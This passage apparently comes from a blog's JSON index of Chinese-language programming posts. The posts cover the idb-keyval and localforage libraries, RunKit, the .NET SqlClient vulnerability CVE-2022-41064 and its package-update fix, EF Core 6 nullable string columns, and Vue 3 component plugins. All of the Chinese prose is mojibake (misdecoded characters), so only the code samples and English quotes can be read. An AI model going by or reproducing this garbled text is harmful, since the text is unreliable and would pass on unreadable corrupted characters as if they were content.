0) + 1); // å°‡è‡ªå‹•æ’éšŠæ›´æ–°ï¼Œæ‰€ä»¥ç¬¬ä¸€æ¬¡æ›´æ–°å°‡è¨ˆæ•¸å™¨è¨­å®šç‚º 1ï¼Œç¬¬äºŒæ¬¡æ›´æ–°å°‡å…¶è¨­å®šç‚º 2ã€‚ clear clearï¼š æ¸…é™¤æ‰€æœ‰è³‡æ–™\n1 2 3 import { clear } from \u0026#39;idb-keyval\u0026#39;; clear(); entries entriesï¼š è¿”å› [key, value] å½¢å¼çš„è³‡æ–™\n1 2 3 4 import { entries } from \u0026#39;idb-keyval\u0026#39;; // logs: [[123, 456], [\u0026#39;hello\u0026#39;, \u0026#39;world\u0026#39;]] entries().then((entries) =\u0026gt; console.log(entries)); keys keysï¼š ç²å–æ‰€æœ‰è³‡æ–™çš„ key\n1 2 3 4 import { keys } from \u0026#39;idb-keyval\u0026#39;; // logs: [123, \u0026#39;hello\u0026#39;] keys().then((keys) =\u0026gt; console.log(keys)); values valuesï¼š ç²å–æ‰€æœ‰è³‡æ–™çš„ value\n1 2 3 4 import { values } from \u0026#39;idb-keyval\u0026#39;; // logs: [456, \u0026#39;world\u0026#39;] values().then((values) =\u0026gt; console.log(values)); createStore createStoreï¼š è‡ªå®šç¾©å€‰åº«\n1 2 3 4 5 6 7 8 9 10 11 // è‡ªå®šç¾©è³‡æ–™åº«åç¨±åŠè¡¨åç¨± // å»ºç«‹ä¸€å€‹æ•¸æ“šåº«: // è³‡æ–™åº«åç¨±ç‚º tang_shiï¼Œè¡¨åç‚º table1 const tang_shi_table1 = idbKeyval.createStore(\u0026#39;tang_shi\u0026#39;, \u0026#39;table1\u0026#39;); // å‘å°æ‡‰å€‰åº«æ–°å¢è³‡æ–™ idbKeyval.set(\u0026#39;add\u0026#39;, \u0026#39;table1 çš„è³‡æ–™\u0026#39;, tang_shi_table1); // é è¨­å»ºç«‹çš„å€‰åº«åç¨±ç‚º keyval-storeï¼Œè¡¨åç‚º keyval idbKeyval.set(\u0026#39;add\u0026#39;, \u0026#39;é è¨­çš„è³‡æ–™\u0026#39;); ä½¿ç”¨ createStore å»ºç«‹çš„è³‡æ–™åº«ä¸€å€‹åº«åªæœƒå»ºç«‹ä¸€å€‹è¡¨ï¼š\n1 2 3 4 5 6 7 // åŒä¸€å€‹åº«æœ‰ä¸å¯ä»¥æœ‰å…©å€‹è¡¨ï¼Œcustom-store-2 ä¸æœƒå»ºç«‹æˆåŠŸ: const customStore = createStore(\u0026#39;custom-db-name\u0026#39;, \u0026#39;custom-store-name\u0026#39;); const customStore2 = createStore(\u0026#39;custom-db-name\u0026#39;, \u0026#39;custom-store-2\u0026#39;); // ä¸åŒçš„åº«æœ‰ç›¸åŒçš„è¡¨åï¼Œé€™æ˜¯å¯ä»¥çš„: const customStore3 = createStore(\u0026#39;db3\u0026#39;, \u0026#39;keyval\u0026#39;); const customStore4 = createStore(\u0026#39;db4\u0026#39;, \u0026#39;keyval\u0026#39;); ç¸½çµ æœ¬æ–‡ä»‹ç´¹äº†å…©å€‹ IndexedDB çš„åº«ï¼Œç”¨ä¾†è§£æ±º localStorage å„²å­˜å®¹é‡å¤ªå°çš„å•é¡Œã€‚\nlocalforage èˆ‡ idb-keyval ä¹‹é–“æˆ‘æ›´å–œæ­¡ localforage å› ç‚ºå…¶èˆ‡ localStorage ç›¸ä¼¼çš„ api å¹¾ä¹æ²’æœ‰ä¸Šæ‰‹æˆæœ¬ã€‚\nå¦‚æœéœ€è¦æ›´åŠ éˆæ´»çš„åº«å¯ä»¥çœ‹ä¸€ä¸‹ dexie.jsã€PouchDBã€idbã€JsStore æˆ–è€… lovefield ä¹‹é¡çš„åº«ã€‚\n","date":"2022-11-15T00:00:00Z","image":"https://live.staticflickr.com/65535/52501465120_8e19a1cda3_o.png","permalink":"https://wayneblog.ga/2022-11-15/localforage-and-idb-keyval/","title":"localStorage å®¹é‡å¤ªå°ï¼Ÿè©¦è©¦ localforageã€idb-keyval"},{"content":" åƒè€ƒç¶²ç«™\nè©¦ç”¨RunKit å…ˆä¾†èªªèªª RunKit æ˜¯ä»€éº¼ã€‚\né¦–å…ˆï¼ŒRunkit å¯ä»¥è®“ä½ åœ¨ç€è¦½å™¨ä¸­é‹è¡Œ Node.js çš„ä»£ç¢¼ã€‚åœ¨ Runkit ä¸­ï¼Œå¯ä»¥å¾ˆæ–¹ä¾¿çš„èª¿ç”¨çœ¾å¤šçš„ npm æ¨¡å¡Šã€‚é€™å°±æœ‰é»åƒ Node.js ç‰ˆçš„ Jupyter Notebookã€‚åŒæ™‚ï¼ŒRunkit é‚„å¯ä»¥æä¾›ä¸€å€‹å…è²»çš„ HTTP æœå‹™å™¨è€Œç„¡éœ€ä»»ä½•çš„æœå‹™å™¨å®‰è£å’Œé…ç½®ã€‚é€™åœ¨é–‹ç™¼æ‰‹æ©Ÿ APP çš„æœå‹™å™¨ç«¯ï¼Œä»¥åŠå¾®æœå‹™çš„æ™‚å€™å°¤å…¶æœ‰ç”¨ã€‚ç•¶ç„¶ï¼Œå¯¦ç¾ç„¡æœå‹™å™¨çš„é¸æ“‡å¾ˆå¤šï¼Œæ¯”å¦‚ AWS çš„ Lambda + API Gatewayï¼Œä½† RunKit çš„æœ€å¤§å„ªå‹¢å°±æ˜¯å®Œå…¨å…è²»çš„ï¼Œé€™åœ¨é–‹ç™¼è»Ÿä»¶åŸå‹çš„æ™‚å€™å°±æ›´ç‚ºæ–¹ä¾¿äº†ã€‚\nä¸‹é¢åˆ†åˆ¥ä¾†çœ‹çœ‹é€™å…©é …åŠŸèƒ½ã€‚\næ‰“é–‹é é¢ï¼š https://runkit.com/home\nå¯ä»¥é€šé Github æˆæ¬Šç™»éŒ„ï¼š\nç™»éŒ„æˆåŠŸå¾Œå¯ä»¥çœ‹åˆ°ï¼š\né»æ“Šé‹è¡ŒæŒ‰éˆ•å¾Œå°±å¯ä»¥åœ¨é é¢ä¸­çœ‹åˆ°åŸ·è¡Œçµæœï¼š\nåœ¨ Runkit çš„é é¢ä¸­å¯ä»¥åƒæ­£å¸¸çš„ Node.js ç’°å¢ƒä¸€æ¨£é‹è¡Œå„ç¨® JS èªå¥ã€‚æ¯”å¦‚ï¼Œé‹è¡Œå¦‚ä¸‹çš„ç°¡å–®ä»£ç¢¼ç²å– Hive ä¸­æ–‡å€çš„æœ€æ–°æ–‡ç« ï¼š\n1 2 3 4 5 6 7 8 9 const hive = require(\u0026#39;@hiveio/hive-js\u0026#39;); // Read posts from Hive hive.api.getDiscussionsByCreated({ tag: \u0026#39;hive-105017\u0026#39;, limit: 10 }, function(err, discussions) { for (let i = 0; i \u0026lt; discussions.length; i++) { let post = discussions[i] console.log(post.title) } }) å¯ä»¥çœ‹åˆ°è¿”å›çš„ç»“æœï¼š\nAPI Endpoint å†ä¾†çœ‹çœ‹æˆ‘æœ€å–œæ­¡çš„ Runkit åŠŸèƒ½ï¼šæä¾›ç°¡å–®çš„ API endpointã€‚\néå¸¸ç°¡å–®çš„æºç¢¼ï¼š\n1 exports.endpoint = function(request, response) { response.end(\u0026#34;API endpoint test\u0026#34;); } å–®æ“Š publish é€²è¡Œç™¼å¸ƒï¼š\nç™¼å¸ƒå¾Œå–®æ“Š endpoint å°±æœƒæ‰“é–‹å°æ‡‰çš„ API URLï¼š\næ¯”å¦‚èªªï¼Œæˆ‘é€™è£¡çš„å°±æ˜¯ï¼š\nhttps://api-jdcmj9qsmxmb.runkit.sh/\nå¯ä»¥çœ‹åˆ°ï¼Œç„¡éœ€é…ç½®/é‹è¡Œæœå‹™å™¨ï¼Œå°±å¯ä»¥æœ‰è‡ªå·±çš„ API å¯ç”¨ï¼Œåˆæ˜¯ serverlessï¼ŒåŒæ™‚é‚„å…è²»ï¼Œæ˜¯ä¸æ˜¯å¾ˆçˆ½ï¼Ÿ\n","date":"2022-11-14T00:00:00Z","image":"https://live.staticflickr.com/65535/52498373077_445fbf68b7_o.jpg","permalink":"https://wayneblog.ga/2022-11-14/try-runkit/","title":"è©¦ç”¨ RunKit"},{"content":" åƒè€ƒç¶²ç«™\nå¾®è»Ÿåœ¨ 2022-11-08 å…¬ä½ˆäº† System.Data.SqlClientã€Microsoft.Data.SqlClient çš„å®‰å…¨æ¼æ´ï¼Œç”±æ–¼æ¶µè“‹å¤§é‡ .NET ç‰ˆæœ¬ (.NET Framework åˆ° .NET 6 éƒ½å¯èƒ½ä½¿ç”¨åˆ°)ï¼Œç¯„åœä¸å°ï¼Œèº«ç‚º .NET é–‹ç™¼äººå“¡ï¼Œæ‡‰è©²é—œæ³¨å…¶å½±éŸ¿åŠä¿®è£œæ–¹å¼ã€‚\nåƒè€ƒäº†ä»¥ä¸‹æ–‡ä»¶ï¼Œè©¦è‘—æ•´ç†è³‡è¨Šå¦‚å¾Œã€‚\nMicrosoft Security Advisory CVE 2022-41064 | .NET Information Disclosure Vulnerability #239 .NET Information Disclosure Vulnerability GHSA-8g2p-5pqh by GitHub .NET Framework Information Disclosure Vulnerability CVE-2022-41064 .NET Framework November 2022 Security and Quality Rollup Updates æ¼æ´ä¾†æºåŠæ”»æ“Šæ–¹å¼ æ¼æ´ç™¼ç”ŸåŸå› æ˜¯ç¾æœ‰ SQL Client ç¨‹å¼åº«æœ‰å€‹ Bugï¼Œåœ¨é«˜è² è¼‰ç‹€æ³ä¸‹ã€ŒéåŒæ­¥æŸ¥è©¢(Asynchronously Executed Query)ã€æœ‰å¯èƒ½ç™¼ç”ŸéŒ¯æ¥æŸ¥è©¢çµæœçš„ç‹€æ³ï¼Œäº¦å³æŸ¥è©¢ A æ‹¿åˆ°æŸ¥è©¢ B çš„çµæœã€‚\nè¨»ï¼šè³‡è¨Šæœ‰é™ï¼Œä½† Asynchronously Executed Query æ‡‰æŒ‡ ExecuteReaderAsyncã€ExecuteScalarAsyncã€ExecuteXmlReaderAsync ç­‰éåŒæ­¥æ–¹æ³•åƒè€ƒï¼ŒåŒæ­¥å¼æŸ¥è©¢(ExecuteReader()\u0026hellip;)åœ¨ä¸€äº›ç‹€æ…‹ä¸‹ä¹Ÿæœ‰å¯èƒ½å—å½±éŸ¿ã€‚(åœ¨ Github æ‰¾åˆ°ç›¸é—œå–®å…ƒæ¸¬è©¦ï¼Œé€é ExecuteReader() ä½†ä¸è®€å–å…§å®¹å°±æ‹‹æ£„ Transaction Scope æ–¹å¼é‡ç¾)\næ”»æ“ŠæˆåŠŸæ¢ä»¶ï¼šåƒè€ƒ\nExploiting this vulnerability requires an attacker to be within the SQL Connection Pool.\næ”»æ“Šè€…é ˆä½æ–¼åŒä¸€ SQL Connection Pool å…§ (æ›è¨€ä¹‹ï¼Œåœ¨åŒä¸€ Process å…§åŸ·è¡Œ) Successful exploitation of this vulnerability requires an attacker to exhaust all the threads in the thread pool.\næ”»æ“Šè€…éœ€è€—ç›¡æ‰€æœ‰ Thread Pool æ‰€æœ‰ Thread In this case, a successful attack could cause the attacker access queries from other users in the SQL Connection Pool.\nåœ¨æ­¤ç‹€æ³ä¸‹ï¼Œæ”»æ“Šè€…æœ‰æ©Ÿæœƒå­˜å–åˆ°åŒ SQL Connetion Pool å…¶ä»–ä½¿ç”¨è€…çš„æŸ¥è©¢çµæœ(æ’¿åˆ°ä»€éº¼å…§å®¹å±¬éš¨æ©Ÿæ€§è³ª) æ¼æ´ç¯„åœ æ¼æ´å­˜åœ¨ Microsoft.Data.SqlClient åŠ System.Data.SqlClient çœ¾å¤šç‰ˆæœ¬ï¼š\nMicrosoft.Data.SqlClient 1.1.3 (å«)ä¹‹å‰åŠ 2.0.0 ~ 2.1.1 System.Data.SqlClient 4.8.4 (å«)ä¹‹å‰ç‰ˆæœ¬ è€Œå¾®è»Ÿä¹Ÿå·²é‡‹å‡º 1.1.4ã€2.1.2ã€4.8.5 ä¿®è£œæ¼æ´\nä¿®è£œæ–¹å¼ .NET Core / .NET 5/6 ä½¿ç”¨ä»¥ä¸‹æ–¹å¼æ›´æ–°ç‰ˆæœ¬ï¼š\n1 2 3 4 5 6 7 dotnet add package Microsoft.Data.SqlClient --version 2.1.2 # æˆ– dotnet add package Microsoft.Data.SqlClient --version 1.1.4 # æˆ– dotnet add package System.Data.SqlClient --version 4.8.5 æˆ–è€…ç›´æ¥ä¿®æ”¹ .csprojï¼š(è‹¥å°ˆæ¡ˆå…ˆåƒç…§å…¶ä»–ç¨‹å¼åº«å†é–“æ¥åƒç…§ SqlClientï¼Œä¹Ÿéœ€è¦åŠ å…¥ PackageReference å¼·åˆ¶ä½¿ç”¨æ–°ç‰ˆ)\n1 2 3 4 5 6 7 8 9 10 11 12 13 \u0026lt;Project Sdk=\u0026#34;Microsoft.NET.Sdk.Web\u0026#34;\u0026gt; \u0026lt;PropertyGroup\u0026gt; \u0026lt;TargetFramework\u0026gt;net6.0\u0026lt;/TargetFramework\u0026gt; \u0026lt;Nullable\u0026gt;enable\u0026lt;/Nullable\u0026gt; \u0026lt;ImplicitUsings\u0026gt;enable\u0026lt;/ImplicitUsings\u0026gt; \u0026lt;/PropertyGroup\u0026gt; \u0026lt;ItemGroup\u0026gt; \u0026lt;PackageReference Include=\u0026#34;Microsoft.Data.SqlClient\u0026#34; Version=\u0026#34;2.1.2\u0026#34; /\u0026gt; \u0026lt;/ItemGroup\u0026gt; \u0026lt;/Project\u0026gt; .NET Framework è«‹å®‰è£ November 2022 Security and Quality Rollup Updates for .NET Frameworkã€‚\n","date":"2022-11-11T00:00:00Z","image":"https://live.staticflickr.com/65535/52491745274_95b2fa11ec_o.jpg","permalink":"https://wayneblog.ga/2022-11-11/dotnet-cve-2022-41064/","title":".NET SqlClient å®‰å…¨æ¼æ´ CVE-2022-41064 è§£è®€"},{"content":" åƒè€ƒç¶²ç«™\nå‡ç´š .NET 6 è¸©åˆ°çš„å°å•é¡Œç­†è¨˜ã€‚\nå‰æƒ…æè¦ ä¾ä¹‹å‰å­¸åˆ°çš„ EF Core Model è¨­è¨ˆï¼Œstring å±¬æ€§é è¨­å°æ‡‰çš„æ¬„ä½é è¨­ç‚º Nullableï¼Œæ¨™è¨» [Required] æ‰æœƒå®£å‘Šç‚º NOT NULLã€‚ ä¸éï¼Œé€™æ¢è¦å‰‡åˆ° .NET 6 å·²æœ‰æ‰€æ”¹è®Šã€‚æŸæ®µ EF Core å¯«å…¥è³‡æ–™åº«æ™‚å†’å‡ºæ¬„ä½ä¸å…è¨± NULLï¼Œä½† Model ä¸­è©²å±¬æ€§ä¸¦æœªå®£å‘Šç‚º [Required]ã€‚\nç ”ç©¶ç™¼ç¾é€™èˆ‡ .NET 6 å•Ÿç”¨ Nullable Context æœ‰é—œï¼Œcsproj å¤šäº† \u0026lt;Nullable\u0026gt;enable\u0026lt;/Nullable\u0026gt; è¨­å®šä»¥æ”¯æ´ C# 8 æ¨å‡ºçš„ Nullable Reference Type æ¦‚å¿µã€‚ è¨­ç‚º enable æ™‚ï¼ŒCompiler å•Ÿç”¨ Null Reference Analysis åŠç›¸é—œèªè¨€ç‰¹æ€§ï¼Œä»¥å­—ä¸²ç‚ºä¾‹ï¼Œè‹¥ string æ²’å®£å‘Šæˆ string? å»å¯èƒ½ç‚º null æ™‚æœƒå¾—åˆ°è­¦å‘Šï¼›è‹¥è¦æ˜ç¢ºæ¨™ç¤ºæ­¤è™•å°±æ˜¯è¦è¨­æˆ nullï¼Œå¯åœ¨å¾Œæ–¹åŠ ä¸Š Null-Forgiving Operatorï¼Œ ä¾‹å¦‚ string x = null!;ã€‚\nè‹¥ä¸æƒ³å•Ÿç”¨æ­¤ç‰¹æ€§ï¼Œè¨­æˆ disableï¼ŒCompiler å³æœƒæ¢å¾© C# 7.3 ä»¥å‰çš„è¡Œç‚ºã€‚\nEF Core ç”¢ç”Ÿè³‡æ–™åº«å°æ‡‰ SQL Schema æ™‚ï¼Œä¹Ÿæœƒå— Nullable Context å½±éŸ¿ï¼Œç•¶ \u0026lt;Nullable\u0026gt;enable\u0026lt;/Nullable\u0026gt;ï¼Œå³ä½¿æœªåŠ  [Required]ï¼ŒModel çš„å­—ä¸²å±¬æ€§ä»æœƒè¢«è¦–ç‚ºä¸å¯ç‚º nullï¼Œåœ¨ CREATE TABLE æ™‚æœƒåŠ ä¸Š NOT NULLã€‚\nå•é¡Œé‡ç¾ ç”¨ä»¥ä¸‹ç¨‹å¼é‡ç¾å•é¡Œã€‚ç°¡å–®å®£å‘Šäº† Entity å‹åˆ¥ã€DbContextï¼Œå…¶ä¸­ RequiredText æœ‰åŠ è¨» [Required]ï¼Œå¦ä¸€å€‹ OptionalText å‰‡æ²’æœ‰ï¼Œå‘¼å« DbContext.DataBase.GenerateCreateScript() æª¢è¦–å…¶å°æ‡‰çš„ SQL Schemaï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 using System.ComponentModel.DataAnnotations; using Microsoft.EntityFrameworkCore; var options = new DbContextOptionsBuilder\u0026lt;MyContext\u0026gt;() .UseSqlServer(\u0026#34;data source=(localdb)\\\\mssqllocaldb\u0026#34;) .Options; var dbCtx = new MyContext(options); Console.WriteLine(dbCtx.Database.GenerateCreateScript()); class MyContext : DbContext { public DbSet\u0026lt;Item\u0026gt; Items { get; set; } = null!; public MyContext(DbContextOptions\u0026lt;MyContext\u0026gt; options) : base(options) { } } public class Item //Entity å‹åˆ¥ { //æ…£ä¾‹ï¼Œå±¬æ€§åç¨±ç‚º Id æˆ– \u0026lt;type name\u0026gt;Id æœƒè‡ªå‹•æˆç‚º Entity çš„ Key public int ItemId { get; set; } [Required] public string RequiredText { get; set; } = null!; public string OptionalText { get; set; } = null!; } å¦‚ä¸‹åœ–æ‰€ç¤ºï¼Œç•¶ \u0026lt;Nullable\u0026gt;enable\u0026lt;/Nullable\u0026gt; æ™‚ï¼ŒOptionalText ä¹Ÿæœƒè¢«åŠ ä¸Š NOT NULLï¼Œæ›æˆ disable æ‰æœƒæ¢å¾©ä¹‹å‰çš„è¦å‰‡ã€‚\næ‰€ä»¥ï¼Œ.NET 6 å•Ÿç”¨ Nullable Context æ™‚ï¼ŒModel å­—ä¸²å±¬æ€§è¦å…è¨± nullï¼Œå‹åˆ¥ä¹Ÿéœ€æ”¹æˆ string?ï¼Œé€™æ¨£æ‰æœƒå°æ‡‰æˆ Nullable è³‡æ–™åº«æ¬„ä½ã€‚(è¨»ï¼šRequiredText æ•…æ„æ‹¿æ‰ = null! è§¸ç™¼ CS8618 è­¦å‘Šï¼Œè­‰æ˜æœ‰è¨­ \u0026lt;Nullable\u0026gt;enable\u0026lt;/Nullable\u0026gt;)\n","date":"2022-11-10T00:00:00Z","image":"https://live.staticflickr.com/65535/52489392442_2208a4dc64_o.png","permalink":"https://wayneblog.ga/2022-11-10/efcore-6-string-not-null/","title":"Entity Framework Core 6.0 å­—ä¸²å±¬æ€§å°æ‡‰æ¬„ä½ NOT NULL å•é¡Œ"},{"content":" åƒè€ƒç¶²ç«™\nå‰æƒ…æè¦ åœ¨å°å°ˆæ¡ˆè£¡æˆ‘ä¸»è¦ç”¨ Vue.js ä¾†è™•ç† MVVMï¼Œç”¨ \u0026lt;script\u0026gt; è¼‰å…¥ vue.jsï¼Œå¯«å¹¾è¡Œ JavaScript æå®šï¼Œèµ°ä¸å¯«æ¨¡çµ„ï¼Œä¸ç”¨ TypeScriptï¼Œå…ç·¨è­¯æ‰“åŒ…çš„ã€Œè¼•å‰ç«¯ã€æ¨¡å¼ï¼Œä½†å¸¸ç”¨é‚è¼¯é‚„æ˜¯æœƒå¯«æˆå…ƒä»¶(Component)æ–¹ä¾¿å…±ç”¨ã€‚\nåœ¨ Vue 2 æ™‚ä»£ï¼Œæˆ‘ç¿’æ…£åœ¨ç¶²é å…±ç”¨çš„ .js è£¡ä½¿ç”¨ Vue.component(\u0026quot;my-component\u0026quot;, ...) è¨»å†Šå…ƒä»¶ï¼Œè¨»å†Šä¸€æ¬¡ï¼Œå„ç¶²é ä¸éœ€å®£å‘Šå°±èƒ½ä½¿ç”¨å…ƒä»¶ã€‚\næ­£å¼æ“ºè„« IE å¾Œï¼Œçµ‚æ–¼ä¸ç”¨å†æ­»å®ˆ Vue 2ï¼Œè©¦è‘—å°‡ä¸€å€‹å°å°ˆæ¡ˆå‡ç´šåˆ° Vue 3ï¼Œé‡åˆ°å°éº»ç…©ã€‚\nVue 3 æ”¹è®Šäº†å…ƒä»¶è¨»å†Šæ–¹å¼ï¼Œä¸å†æä¾›å…¨åŸŸè¨»å†Šï¼Œå¿…é ˆå…ˆ Vue.createApp() å»ºç«‹å¯¦é«”ï¼Œapp.component(\u0026quot;my-component\u0026quot;, ...) è¨»å†Šæˆ–ç”¨ components å±¬æ€§å¼•ç”¨æ‰èƒ½ä½¿ç”¨å…ƒä»¶ã€‚åƒè€ƒï¼šé‡æ–°èªè­˜ Vue.js - å…ƒä»¶çš„å®£å‘Šèˆ‡è¨»å†Š\nå…¨åŸŸå…ƒä»¶æ”¹æˆå€åŸŸå…ƒä»¶å¯æ¸›å°‘ç¨‹å¼é–“äº’ç›¸å¹²æ“¾ï¼Œåœ¨è»Ÿé«”æ¶æ§‹ä¾†èªªæ˜¯æ­£ç¢ºçš„æ–¹å‘ï¼Œä½†å°ç°¡å–®æ‡‰ç”¨ä¾†èªª(ä¾‹å¦‚ï¼šç¨‹å¼å¾ˆå–®ç´”ï¼Œå…¨åŸŸå…ƒä»¶æ‰“æ¶æ©Ÿç‡è¶¨æ–¼é›¶çš„å ´åˆ)ï¼Œé€™ç•ªèª¿æ•´è®“å…ƒä»¶è¨»å†Šè®Šå¾—ç¹ç‘£ã€‚\nç”¨å€‹ç¯„ä¾‹ä¾†èªªæ˜ã€‚\nVue 2 è¨»å†Šå¤šå€‹å…ƒä»¶ åŸæœ¬ Vue 2 åšæ³•æ˜¯åœ¨ my-components-vue2.js ä¸­è¨»å†Šå¤šå€‹å…ƒä»¶ï¼š\nmy-components-vue2.js 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 Vue.component(\u0026#39;date-tag\u0026#39;, { template: \u0026#39;\u0026lt;div\u0026gt;{{date}}\u0026lt;/div\u0026gt;\u0026#39;, data: function () { return { date: new Date().toJSON().slice(0, 10) }; } }); Vue.component(\u0026#39;time-tag\u0026#39;, { template: \u0026#39;\u0026lt;div\u0026gt;{{time}}\u0026lt;/div\u0026gt;\u0026#39;, data: function () { return { time: new Date().toJSON().slice(11, 19) }; } }); Vue.component(\u0026#39;host-tag\u0026#39;, { template: \u0026#39;\u0026lt;div\u0026gt;{{host}}\u0026lt;/div\u0026gt;\u0026#39;, data: function () { return { host: location.host }; } }); å¦‚æ­¤ï¼Œæ•¸åæ”¯ HTML åªéœ€è¼‰å…¥ my-components-vue2.js ä¾¿èƒ½åœ¨ç¶²é ä½¿ç”¨ \u0026lt;date-tag\u0026gt;ã€\u0026lt;time-tag\u0026gt; æ’å…¥å…ƒä»¶ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;utf-8\u0026#34;\u0026gt; \u0026lt;script src=\u0026#34;https://cdn.jsdelivr.net/npm/vue@2.7.10/dist/vue.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script src=\u0026#34;my-components-vue2.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;div id=\u0026#34;app\u0026#34;\u0026gt; \u0026lt;date-tag\u0026gt;\u0026lt;/date-tag\u0026gt; \u0026lt;time-tag\u0026gt;\u0026lt;/time-tag\u0026gt; \u0026lt;host-tag\u0026gt;\u0026lt;/host-tag\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;script\u0026gt; var app = new Vue({ el: \u0026#39;#app\u0026#39; }); \u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; å‡ç´š Vue 3 ä¹‹å¾Œ å‡ç´š Vue 3 ä¹‹å¾Œï¼Œå…ƒä»¶çš„ js è·Ÿç¶²é éƒ½è¦åšä¸€äº›ä¿®æ”¹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 var dateTag = { template: \u0026#39;\u0026lt;div\u0026gt;{{date}}\u0026lt;/div\u0026gt;\u0026#39;, data: function () { return { date: new Date().toJSON().slice(0, 10) }; } }; var timeTag = { template: \u0026#39;\u0026lt;div\u0026gt;{{time}}\u0026lt;/div\u0026gt;\u0026#39;, data: function () { return { time: new Date().toJSON().slice(11, 19) }; } }; var hostTag = { template: \u0026#39;\u0026lt;div\u0026gt;{{host}}\u0026lt;/div\u0026gt;\u0026#39;, data: function () { return { host: location.host }; } }; å»ºç«‹ app å¯«æ³•æ”¹ç‚º Vue.createAppï¼Œä¸¦åœ¨å®£å‘Šä¸­é€é components åˆ—èˆ‰è¦è¨»å†Šçš„ç‰©ä»¶ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;utf-8\u0026#34;\u0026gt; \u0026lt;script src=\u0026#34;https://unpkg.com/vue@3\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script src=\u0026#34;my-components-vue3-upgrade.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;div id=\u0026#34;app\u0026#34;\u0026gt; \u0026lt;date-tag\u0026gt;\u0026lt;/date-tag\u0026gt; \u0026lt;time-tag\u0026gt;\u0026lt;/time-tag\u0026gt; \u0026lt;host-tag\u0026gt;\u0026lt;/host-tag\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;script\u0026gt; var app = Vue.createApp({ components: { \u0026#39;date-tag\u0026#39;: dateTag, \u0026#39;time-tag\u0026#39;: timeTag, \u0026#39;host-tag\u0026#39;: hostTag } // è‹¥å…ƒä»¶ç‰©ä»¶åç¨±èˆ‡æ¨™ç±¤ç›¸ç¬¦ï¼Œå¯ç°¡å¯«æˆ // components: { dateTag, timeTag, hostTag } }) .mount(\u0026#39;#app\u0026#39;); \u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; å‡è¨­æˆ‘æœ‰ 30 å€‹ç¶²é ï¼Œ30 å€‹ app éƒ½è¦åŠ  components: { dateTag, timeTag, hostTag }ï¼Œæœªä¾†è‹¥æ–°å¢å…¶ä»–å…ƒä»¶ï¼Œæ‰€æœ‰ components åˆ—èˆ‰éƒ½è¦æ”¹ï¼Œé€™æ˜¯æ¨™æº–çš„ã€ŒCopy \u0026amp; Paste è² é¢æ•™æã€å‘€ï¼Œä¸€æƒ³å°±è¦ºå¾—å¾ˆä¸ OK å‘€ã€‚\né€™ç¨®æƒ…å¢ƒï¼Œå°±æ˜¯å¥—ä»¶(Pluginï¼Œä¹Ÿæœ‰äººç¿»æˆæ’ä»¶ã€å¤–æ›)ä¸Šå ´çš„æ™‚åˆ»ã€‚æœ€ç°¡å–®çš„å¥—ä»¶å¯«æ³•æ˜¯å¯«ä¸€å€‹ functionï¼Œæ¥æ”¶ app åŠ options åƒæ•¸ï¼Œå…§éƒ¨å‘¼å« app.component(...) é€ä¸€è¨»å†Šå…ƒä»¶ï¼Œoptions å‰‡æ˜¯è‡ªè¨‚åƒæ•¸ï¼Œå¯ç”¨ä¾†æ±ºå®šè¦è¨»å†Šå“ªäº›å…ƒä»¶æˆ–è®Šæ›´å…ƒä»¶è¨­å®šå€¼ï¼Œæé«˜é‹ç”¨å½ˆæ€§ã€‚ä»¥ä¸‹æ˜¯ç°¡å–®ç¤ºç¯„ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 function myComponentsPlugin(app, options) { app.component(\u0026#39;date-tag\u0026#39;, { template: \u0026#39;\u0026lt;div\u0026gt;{{date}}\u0026lt;/div\u0026gt;\u0026#39;, data: function () { return { date: new Date().toJSON().slice(0, 10) }; } }); app.component(\u0026#39;time-tag\u0026#39;, { template: \u0026#39;\u0026lt;div\u0026gt;{{time}}\u0026lt;/div\u0026gt;\u0026#39;, data: function () { return { time: new Date().toJSON().slice(11, 19) }; } }); app.component(\u0026#39;host-tag\u0026#39;, { template: \u0026#39;\u0026lt;div\u0026gt;{{host}}\u0026lt;/div\u0026gt;\u0026#39;, data: function () { return { host: location.host }; } }); } å¦‚æ­¤ï¼Œå‘¼å«ç«¯å¯ç°¡åŒ–ç‚º .use(myComponentsPlugin)ï¼Œä¸éœ€æŠŠæ‰€æœ‰å…ƒä»¶åˆ—å‡ºä¾†ï¼Œæœªä¾†è¦æ–°å¢å…ƒä»¶ï¼Œä¿®æ”¹ my-components-vue3.js å³å¯ï¼Œä¿ç•™åŸå…ˆå…¨åŸŸå…ƒä»¶çš„ç°¡å–®æ–¹ä¾¿ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;utf-8\u0026#34;\u0026gt; \u0026lt;script src=\u0026#34;https://unpkg.com/vue@3\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script src=\u0026#34;my-components-vue3.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; 